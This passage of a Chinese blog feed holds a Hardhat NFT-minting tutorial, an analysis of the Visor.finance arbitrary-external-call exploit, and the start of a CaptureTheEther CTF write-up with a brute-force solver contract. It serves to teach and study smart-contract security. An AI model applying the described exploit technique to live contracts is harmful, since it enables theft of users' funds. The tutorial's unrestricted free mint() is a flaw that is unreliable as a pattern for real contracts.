class="params"></span>) </span>&#123;</span><br><span class="line">  it(<span class="string">&quot;Should return the new greeting once it&#x27;s changed&quot;</span>, <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>在 <code>ether.js</code>中， ContractFactory 是一个用于部署新合约的抽象，所以这里的 Greeter 是 Greeter 合约的工厂函数。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> Greeter = <span class="keyword">await</span> ethers.getContractFactory(<span class="string">&quot;Greeter&quot;</span>);</span><br></pre></td></tr></table></figure><p>在 ContractFactory 上调用 <code>deploy()</code>就会部署合约，并返回一个解析为 contract 的Promise，这是为智能合约的每个功能提供方法的对象，这里将 <code>Hello World!</code>作为参数传递给合约的构造函数。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> greeter = <span class="keyword">await</span> Greeter.deploy(<span class="string">&quot;Hello, world!&quot;</span>);</span><br></pre></td></tr></table></figure><p>使用 <code>chai</code>库的匹配器<code>expect</code>，检查调用<code>greet()</code>方法时是否匹配<code>Hello, World!</code></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">expect(<span class="keyword">await</span> greeter.greet()).to.equal(<span class="string">&quot;Hello, world!&quot;</span>);</span><br></pre></td></tr></table></figure><p>以同样的方式调用合约方法，修改合约状态，调用<code>setGreeting</code>设置新的参数，在 promise 被解析后，我们执行另一个断言来判断状态是否改变</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> greeter.setGreeting(<span class="string">&quot;Hola, mundo!&quot;</span>);</span><br><span class="line">expect(<span class="keyword">await</span> greeter.greet()).to.equal(<span class="string">&quot;Hola, mundo!&quot;</span>);</span><br></pre></td></tr></table></figure><p>执行结果</p><p><img src="/image/hardhat_init.assets/image-20220417130632372.png" alt="image-20220417130632372"></p></li><li><p>部署合约： <code>npx hardhat run scripts/deploy.js</code></p><p>使用 js 脚本来部署合约项目，如下代码为从实例项目部署合约</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// We get the contract to deploy</span></span><br><span class="line">  <span class="keyword">const</span> Greeter = <span class="keyword">await</span> ethers.getContractFactory(<span class="string">&quot;Greeter&quot;</span>);</span><br><span class="line">  <span class="keyword">const</span> greeter = <span class="keyword">await</span> Greeter.deploy(<span class="string">&quot;Hello, Hardhat!&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">await</span> greeter.deployed();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&quot;Greeter deployed to:&quot;</span>, greeter.address);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line">  .then(<span class="function">() =&gt;</span> process.exit(<span class="number">0</span>))</span><br><span class="line">  .catch(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.error(error);</span><br><span class="line">    process.exit(<span class="number">1</span>);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure></li><li><p>启动本地节点：<code>npx hardhat node</code></p></li><li><p>在 localhost 中部署智能合约：<code>npx hardhat run --network localhost scripts/deploy.js</code></p></li></ol><h3 id="使用-hardhat-构建一个简单的-web3-mint-页面"><a href="#使用-hardhat-构建一个简单的-web3-mint-页面" class="headerlink" title="使用 hardhat 构建一个简单的 web3 mint 页面"></a>使用 hardhat 构建一个简单的 web3 mint 页面</h3><h5 id="0x01-初始化项目"><a href="#0x01-初始化项目" class="headerlink" title="0x01 初始化项目"></a>0x01 初始化项目</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npx create-react-app hardhat-react-1</span><br><span class="line">npx hardhat</span><br><span class="line">npm install @openzeppelin/contracts</span><br></pre></td></tr></table></figure><p>最终的项目结构：</p><p><img src="/image/hardhat_init.assets/image-20220417153740357.png" alt="image-20220417153740357"></p><h5 id="0x02-编译合约"><a href="#0x02-编译合约" class="headerlink" title="0x02 编译合约"></a>0x02 编译合约</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//SPDX-License-Identifier: Unlicense</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;hardhat/console.sol&quot;;</span><br><span class="line">import &#x27;@openzeppelin/contracts/access/Ownable.sol&#x27;;</span><br><span class="line">import &#x27;@openzeppelin/contracts/token/ERC721/extensions/ERC721Enumerable.sol&#x27;;</span><br><span class="line">import &#x27;@openzeppelin/contracts/utils/math/SafeMath.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract MintExample is ERC721Enumerable, Ownable&#123;</span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    constructor (</span><br><span class="line">        string memory name,</span><br><span class="line">        string memory symbol</span><br><span class="line">    ) ERC721(name, symbol) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function mint(uint256 numberOfMints) public payable &#123;</span><br><span class="line">        uint256 supply = totalSupply();</span><br><span class="line">        for(uint256 i; i &lt; numberOfMints; i++) &#123;</span><br><span class="line">            _safeMint(msg.sender, supply + 1);</span><br><span class="line">            balances[msg.sender]++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该合约提供简单的 mint 功能，在合约编写完成后编译合约</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npx hardhat compile</span><br></pre></td></tr></table></figure><p>在合约编译完成后在 artifacts/contracts 文件夹中存储合约的 ABI，在 src 文件夹下新建 <code>mintExampleAbi.json</code>，将合约的 ABI 复制到该文件中</p><p><img src="/image/hardhat_init.assets/image-20220417180403552.png" alt="image-20220417180403552"></p><h5 id="0x03-测试合约"><a href="#0x03-测试合约" class="headerlink" title="0x03 测试合约"></a>0x03 测试合约</h5><p>编写测试文件</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; expect &#125; = <span class="built_in">require</span>(<span class="string">&quot;chai&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; ethers &#125; = <span class="built_in">require</span>(<span class="string">&quot;hardhat&quot;</span>);</span><br><span class="line"></span><br><span class="line">describe(<span class="string">&quot;MintExample&quot;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  it(<span class="string">&quot;Should return the mint balance&quot;</span>, <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//signer表示以太坊账户对象，用于将交易发送到合约和其他账户，在这里获取所连接节点中的账户列表</span></span><br><span class="line">    <span class="comment">//hardhat network 节点只保留第一个账户</span></span><br><span class="line">    <span class="keyword">const</span> [owner] = <span class="keyword">await</span> ethers.getSigners();</span><br><span class="line">    <span class="comment">//ContractFactory 是用于部署新合约的抽象</span></span><br><span class="line">    <span class="keyword">const</span> MintExample = <span class="keyword">await</span> ethers.getContractFactory(<span class="string">&quot;MintExample&quot;</span>);</span><br><span class="line">    <span class="comment">//将俩个参数传入构造函数，这里的 MintExample 是用来实例合约的工厂</span></span><br><span class="line">    <span class="keyword">const</span> mintExample = <span class="keyword">await</span> MintExample.deploy(<span class="string">&quot;MINT&quot;</span>, <span class="string">&quot;MINT&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用 owner 调用合约中的 mint 方法铸造一个 MINT</span></span><br><span class="line">    <span class="keyword">await</span> mintExample.connect(owner).mint(<span class="number">1</span>);</span><br><span class="line"><span class="comment">//利用断言式来判断代币余额与铸造金额是否相等</span></span><br><span class="line">    expect(<span class="keyword">await</span> mintExample.balances(owner.address)).to.equal(<span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在 hardhat 中测试合约</p><p><img src="/image/hardhat_init.assets/image-20220417181225491.png"></p><h5 id="0x05-部署合约"><a href="#0x05-部署合约" class="headerlink" title="0x05 部署合约"></a>0x05 部署合约</h5><p>当通过测试以后部署合约，首先需要启动 hardhat 节点</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npx hardhat node</span><br></pre></td></tr></table></figure><p><img src="/image/hardhat_init.assets/image-20220417182940057.png" alt="image-20220417182940057"></p><p>编写部署脚本，将合约部署到 hardhat 网络，即部署到 localhost</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> hre = <span class="built_in">require</span>(<span class="string">&quot;hardhat&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> MintExample = <span class="keyword">await</span> hre.ethers.getContractFactory(<span class="string">&quot;MintExample&quot;</span>);</span><br><span class="line">  <span class="keyword">const</span> mintExample = <span class="keyword">await</span> MintExample.deploy(<span class="string">&quot;Minter&quot;</span>, <span class="string">&quot;MINT&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">await</span> mintExample.deployed();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&quot;MintExample deployed to:&quot;</span>, mintExample.address);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line">  .then(<span class="function">() =&gt;</span> process.exit(<span class="number">0</span>))</span><br><span class="line">  .catch(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.error(error);</span><br><span class="line">    process.exit(<span class="number">1</span>);</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npx hardhat run scripts/sample-script.js --network localhost</span><br></pre></td></tr></table></figure><p>部署完成后会获取一个合约地址</p><p><img src="/image/hardhat_init.assets/image-20220417181744766.png" alt="image-20220417181744766"></p><h5 id="0x06-编写前端"><a href="#0x06-编写前端" class="headerlink" title="0x06 编写前端"></a>0x06 编写前端</h5><p>以下为<code>App.js</code>代码</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&#x27;./App.css&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> mintExampleAbi <span class="keyword">from</span> <span class="string">&quot;./mintExampleAbi.json&quot;</span></span><br><span class="line"><span class="keyword">import</span> &#123; ethers, Bignumber &#125; <span class="keyword">from</span> <span class="string">&quot;ethers&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; useEffect, useState &#125; <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; use &#125; <span class="keyword">from</span> <span class="string">&#x27;chai&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//合约部署的地址</span></span><br><span class="line"><span class="keyword">const</span> mintExampleAddress = <span class="string">&quot;0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">App</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">//CONNECTING</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//当页面加载时这个变量是空的，当连接后从区块链获取信息时，使用状态可以更新</span></span><br><span class="line">  <span class="keyword">const</span> [accounts, setAccounts] = useState([]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//这个函数会调用 metamask钱包</span></span><br><span class="line">  <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">connectionAccounts</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//window.ethereum 会检查是否运行 metamask </span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">window</span>.ethereum) &#123;</span><br><span class="line">      <span class="keyword">const</span> accounts = <span class="keyword">await</span> <span class="built_in">window</span>.ethereum.request(&#123;<span class="attr">method</span>: <span class="string">&quot;eth_requestAccounts&quot;</span>&#125;);</span><br><span class="line">      setAccounts(accounts);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//当页面加载时调用一次 connectionAccounts 函数</span></span><br><span class="line">  useEffect(<span class="function">() =&gt;</span> &#123;connectionAccounts();&#125;,[]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// MINTING</span></span><br><span class="line">  <span class="keyword">const</span> [mintAmount, setMintAmount] = useState(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">handleMint</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">window</span>.ethereum) &#123;</span><br><span class="line">      <span class="comment">// provider 是一种连接到区块链的特定方式</span></span><br><span class="line">      <span class="keyword">const</span> provider = <span class="keyword">new</span> ethers.providers.Web3Provider(<span class="built_in">window</span>.ethereum);</span><br><span class="line">      <span class="comment">//定义一个 signer ，任何时候的交易涉及代币的交换或者任何具有财务价值的东西都必须签署签名</span></span><br><span class="line">      <span class="keyword">const</span> signer = provider.getSigner();</span><br><span class="line">      <span class="keyword">const</span> contract = <span class="keyword">new</span> ethers.Contract(mintExampleAddress, mintExampleAbi.abi, signer);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//将想要 mint 的数量作为参数传递给 mint</span></span><br><span class="line">        <span class="keyword">const</span> response = <span class="keyword">await</span> contract.mint(mintAmount);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;response: &quot;</span>, response);</span><br><span class="line">      &#125; <span class="keyword">catch</span>(err) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;error&quot;</span>, err);</span><br><span class="line">      &#125; </span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;App&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">h1</span>&gt;</span>This is how you create a mint button<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="xml">      &#123;accounts.length &amp;&amp; (</span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">          <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;()</span> =&gt;</span> setMintAmount(mintAmount - 1)&#125;&gt;-<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">            &#123;mintAmount&#125;</span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;()</span> =&gt;</span> setMintAmount(mintAmount + 1)&#125;&gt;+<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;handleMint&#125;</span>&gt;</span>Mint<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">              Mint</span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">      )&#125;</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> App;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>前端代码完成后在项目目录执行<code>npm run start</code></p><p><img src="/image/hardhat_init.assets/image-20220417183105333.png" alt="image-20220417183105333"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h3&gt;&lt;p&gt;Hardhat 是一个用于编译、部署、测试和调试以太坊软件的开发环境。它可以帮助开发人员管理和自动化构建智能合约和 dApp 过程中固有的重</summary>
      
    
    
    
    <category term="区块链" scheme="https://banana69.site/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    
    <category term="智能合约" scheme="https://banana69.site/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
  </entry>
  
  <entry>
    <title>从 Visor.finance 事件学习任意外部调用漏洞</title>
    <link href="https://banana69.site/2022/03/25/%E4%BB%BB%E6%84%8F%E5%A4%96%E9%83%A8%E8%B0%83%E7%94%A8%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E/"/>
    <id>https://banana69.site/2022/03/25/%E4%BB%BB%E6%84%8F%E5%A4%96%E9%83%A8%E8%B0%83%E7%94%A8%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E/</id>
    <published>2022-03-25T04:42:54.000Z</published>
    <updated>2022-03-25T06:47:55.750Z</updated>
    
    <content type="html"><![CDATA[<h3 id="攻击分析"><a href="#攻击分析" class="headerlink" title="攻击分析"></a>攻击分析</h3><p><img src="/image/%E4%BB%BB%E6%84%8F%E5%A4%96%E9%83%A8%E8%B0%83%E7%94%A8%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E/image-20220320221429315.png" alt="image-20220320221429315"></p><p>首先查看攻击交易：</p><p><a href="https://etherscan.io/tx/0x69272d8c84d67d1da2f6425b339192fa472898dce936f24818fda415c1c1ff3f">https://etherscan.io/tx/0x69272d8c84d67d1da2f6425b339192fa472898dce936f24818fda415c1c1ff3f</a></p><p><img src="/image/%E4%BB%BB%E6%84%8F%E5%A4%96%E9%83%A8%E8%B0%83%E7%94%A8%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E/image-20220320221534097.png" alt="image-20220320221534097"></p><p>可以看到从0地址俩次转出大量的vVISR代币，由于<strong>0地址不会主动转账或者授权配额</strong>，所以可以猜测这些vVISR代币是mint出来的。</p><p>然后使用blocksec的交易分析工具分析，<a href="https://versatile.blocksecteam.com/tx/eth/0x69272d8c84d67d1da2f6425b339192fa472898dce936f24818fda415c1c1ff3f%EF%BC%8C%E4%BD%BF%E7%94%A8">https://versatile.blocksecteam.com/tx/eth/0x69272d8c84d67d1da2f6425b339192fa472898dce936f24818fda415c1c1ff3f，使用</a> invocation flow 功能可以查看调用关系，对其中的地址和函数进行查询找到标签，然后使用<code>customize account map</code>功能，将其替换为自定义标签，可以提高调用关系的可读性。</p><p><img src="/image/%E4%BB%BB%E6%84%8F%E5%A4%96%E9%83%A8%E8%B0%83%E7%94%A8%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E/image-20220320222843697.png" alt="image-20220320222843697"></p><p><img src="/image/%E4%BB%BB%E6%84%8F%E5%A4%96%E9%83%A8%E8%B0%83%E7%94%A8%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E/image-20220320222945110.png" alt="image-20220320222945110"></p><p>自定义后的标签为：</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;0x0000000000000000000000000000000000000000&quot;</span>: <span class="string">&quot;Null Address: 0x000…000&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;0x8efab89b497b887cdaa2fb08ff71e4b3827774b2&quot;</span>: <span class="string">&quot;Visor Finance Exploiter&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;0xf938424f7210f31df2aee3011291b658f872e91e&quot;</span>: <span class="string">&quot;Visor Finance: VISR Token&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;0xc9f27a50f82571c1c8423a42970613b8dbda14ef&quot;</span>: <span class="string">&quot;Visor Finance RewardsHypervisor&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;0x3a84ad5d16adbe566baa6b3dafe39db3d5e261e5&quot;</span>: <span class="string">&quot;vVISR&quot;</span>,</span><br><span class="line"> <span class="attr">&quot;0x10c509aa9ab291c76c45414e7cdbd375e1d5ace8&quot;</span>: <span class="string">&quot;Exploit contract&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>替换标签后的调用关系图为：</p><p><img src="/image/%E4%BB%BB%E6%84%8F%E5%A4%96%E9%83%A8%E8%B0%83%E7%94%A8%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E/image-20220320223428363.png" alt="image-20220320223428363"></p><p>攻击步骤：</p><ol><li>攻击合约的<code>0x4a0b0c38</code>匿名函数调用了<code>Visor Finance RewardsHypervisor</code>合约中的<code>deposit</code>函数，把攻击合约的地址和攻击者的地址作为参数传入；</li><li>在调用<code>deposit</code>函数后，又回调了攻击合约的<code>owner，dekegatedTransferERC20</code>函数；</li><li>在<code>dekegatedTransferERC20</code>函数中重入到了<code>Visor Finance RewardsHypervisor</code>合约并且调用了<code>deposit</code>函数.</li></ol><p>在清楚了攻击流程之后可以推测出<code>RewardsHypervisor </code>合约的 <strong>deposit</strong> 函数内存在<strong>任意外部调用漏洞</strong>。</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>查看<code>RewardsHypervisor</code> 合约的开源代码：</p><p><a href="https://etherscan.io/address/0xc9f27a50f82571c1c8423a42970613b8dbda14ef/advanced#code">https://etherscan.io/address/0xc9f27a50f82571c1c8423a42970613b8dbda14ef/advanced#code</a></p><p><img src="/image/%E4%BB%BB%E6%84%8F%E5%A4%96%E9%83%A8%E8%B0%83%E7%94%A8%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E/image-20220321080927216.png" alt="image-20220321080927216"></p><p>这段代码的逻辑是存入一定数量的<code>visr</code>就会mint出一定数量的<code>vvsir</code>给用户，<code>vvsir</code>为流动性代币，且函数 <code>deposit</code>为 external，可以被外部调用。</p><p>代码分析：</p><ol><li><p>参数<code>visrDeposit</code>为声明存入的<code>Visr</code>的数量；参数<code>from</code>为 visr 来源地址；参数<code>to</code>为 接受 vvsir 的地址；</p></li><li><p>返回值<code>share</code>为 <strong>mint</strong> 出的 vvsir 数量；</p></li><li><p>46-48行判断：存入的 <code>Visr</code>数量必须大于0，且不能讲 mint 的流动性代币发送到 0 地址或者此合约（Visor Finance RewardsHypervisor）的地址；</p></li><li><p>51-54行：如果代币<code>vvisr</code>代币的总供应量不为 0， 那么计算此合约中的 <code>visr</code>的余额（这个合约本身持有<code>visr</code>代币），根据比例计算出需要 <strong>mint</strong> 出的 <code>vvsir</code>的数量，53行为需要 <strong>mint</strong> 的 <code>vvsir</code>的数量<code>share = (visrDeposit / visrBalance) * vvisr总量</code>；</p><p><code>mul(x,y) = x * y, div(x, y) = x / y</code></p><p><code>share.mul(a) = share * a, share.div(a) = share / a</code></p></li><li><p>56-61行：判断发送<code>visr</code>的地址是否为合约地址，如果是合约地址，则检查 <strong>msg.sender</strong> 是不是合约的 <strong>owner</strong>，然后要求这个合约实现 <code>IVsior</code>接口，调用<code>from</code> 的<code>delegatedTransferERC20</code>函数，从<code>from</code>地址向当前合约地址发送<code>visrDeposit</code>数量的 visr。</p><p>由于对 <strong>from</strong> 未作出任何限定，所以 <strong>from</strong> 可以是任何合约。攻击者只需要定义一个<code>delegatedTransferERC20</code>函数就可以绕过充值直接 <strong>mint</strong>。</p></li><li><p>如果 <strong>from</strong> 不是合约地址，就调用 <code>visr.safeTransferFrom</code>函数，由于传入的 <strong>from</strong> 参数和 <strong>to</strong> 参数可控，意味着可以用别人授权给 <strong>RewardsHypervisor</strong> 合约的 <strong>visr</strong> 充值进去，再 <strong>mint vvisr</strong> 给自己。</p></li><li><p>转入<strong>vvisr</strong> 以后可以调用 <code>withdraw</code>函数将其转换成 <strong>visr</strong>，然后在市场上售卖完成变现。</p><p><img src="/image/%E4%BB%BB%E6%84%8F%E5%A4%96%E9%83%A8%E8%B0%83%E7%94%A8%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E/image-20220321132601411.png" alt="image-20220321132601411"></p></li></ol><p> <code>IVsior</code>接口说明：</p><p><img src="/image/%E4%BB%BB%E6%84%8F%E5%A4%96%E9%83%A8%E8%B0%83%E7%94%A8%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E/image-20220321113438989.png" alt="image-20220321113438989"></p><p> <code>IVsior</code>接口就是要求合约转账，这个函数的主要问题在于56-59行中，若传入的地址是合约，那么检测传入 <code>visr</code>的合约地址的 <strong>owner</strong> 是 <strong>msg.sender</strong> ，然后调用 <strong>from</strong> 的 <code>delegatedTransferERC20</code>函数，本意是检测 <strong>msg.sender</strong> 的授权转账。</p><ul><li><p><strong>问题 1:</strong></p><p>因为 <strong>from</strong> 可以是自己实现的合约，所以攻击者可以自己实现 <code>delegatedTransferERC20</code>函数，可以不实现转账并且满足<code>require</code>，并且<code>Hypervisior</code>合约本身就有钱，可以根据参数<code>visrDeposit</code>计算出最后 <strong>mint</strong> 出的 <code>vvisr</code>值发送给攻击者。</p></li><li><p><strong>问题 2:</strong></p><p>判断 <strong>from</strong> 不是合约地址时，<code>visr.safeTransferFrom</code>函数，由于传入的 <strong>from</strong> 参数和 <strong>to</strong> 参数可控，意味着可以用别人授权给 <strong>RewardsHypervisor</strong> 合约的 <strong>visr</strong> 充值进去，再 <strong>mint vvisr</strong> 最后发送给攻击者。</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;攻击分析&quot;&gt;&lt;a href=&quot;#攻击分析&quot; class=&quot;headerlink&quot; title=&quot;攻击分析&quot;&gt;&lt;/a&gt;攻击分析&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/image/%E4%BB%BB%E6%84%8F%E5%A4%96%E9%83%A8%E8%B0%83</summary>
      
    
    
    
    <category term="智能合约" scheme="https://banana69.site/categories/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
    
    <category term="智能合约审计" scheme="https://banana69.site/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>CaptureTheEther WriteUp</title>
    <link href="https://banana69.site/2022/03/17/capturetheether/"/>
    <id>https://banana69.site/2022/03/17/capturetheether/</id>
    <published>2022-03-17T07:21:46.000Z</published>
    <updated>2022-07-28T06:39:38.953Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Guess-the-secret-number"><a href="#Guess-the-secret-number" class="headerlink" title="Guess the secret number"></a>Guess the secret number</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract GuessTheSecretNumberChallenge &#123;</span><br><span class="line">    bytes32 answerHash = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;</span><br><span class="line"></span><br><span class="line">    function GuessTheSecretNumberChallenge() public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance == 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function guess(uint8 n) public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line"></span><br><span class="line">        if (keccak256(n) == answerHash) &#123;</span><br><span class="line">            msg.sender.transfer(2 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题目需要猜一个uint8的变量经过keccak256后的值与answerHash相等，由于uint8的范围是0-255，所以写一个爆破的智能合约就可以解出最后的答案</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//爆破合约</span><br><span class="line">contract crack &#123;</span><br><span class="line">    bytes32 answerHash = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;</span><br><span class="line">    uint8 public result;</span><br><span class="line">   function crackresult() returns (uint8) &#123;</span><br><span class="line">     for (uint8 i = 0; i &lt;= 255; i++) &#123;</span><br><span class="line">         if (keccak256(i) == answerHash) &#123;</span><br><span class="line">             result = i;</span><br><span class="line">             return i;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">//result = 170</span><br></pre></td></tr></table></figure><h3 id="Guess-the-random-number"><a href="#Guess-the-random-number" class="headerlink" title="Guess the random number"></a>Guess the random number</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract GuessTheRandomNumberChallenge &#123;</span><br><span class="line">    uint8 answer;</span><br><span class="line"></span><br><span class="line">    function GuessTheRandomNumberChallenge() public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line">        answer = uint8(keccak256(block.blockhash(block.number - 1), now));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance == 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function guess(uint8 n) public payable &#123;</span><br><span class="line">        require(msg.value == 1 